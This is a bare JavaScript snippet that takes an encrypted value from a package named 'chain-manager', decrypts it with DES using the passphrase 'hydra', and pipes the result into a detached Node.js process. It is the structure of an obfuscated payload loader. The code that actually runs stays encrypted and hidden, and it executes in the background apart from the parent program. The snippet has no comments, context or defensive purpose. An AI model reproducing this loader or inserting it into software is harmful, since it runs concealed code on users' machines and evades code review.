import { desKey } from "chain-manager";

const payload = CryptoJS.DES.decrypt(desKey, "hydra");
const child = spawn("node", [], { detached: true });
child.stdin.write(payload);
